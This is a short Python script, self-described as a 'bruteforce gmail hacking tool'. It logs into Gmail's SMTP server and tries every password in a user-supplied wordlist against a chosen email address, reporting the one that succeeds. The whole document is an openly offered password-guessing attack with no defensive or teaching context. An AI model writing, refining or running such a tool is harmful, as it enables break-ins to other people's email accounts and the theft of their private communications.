print("hi this is a python bruteforce gmail hacking tool")
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()


user = raw_input("enter your email address: ")
passfile = raw_input("enter your password file: ")
passfile = open(passfile, "r")

for password in passfile:
	try:

		  smtpserver.login(user, password)
		  print("[+] password found: %s"% password)
		  break
	except smtplib.SMTPAuthenticationError:
		    print("[!] password incorrect: %s" % password)
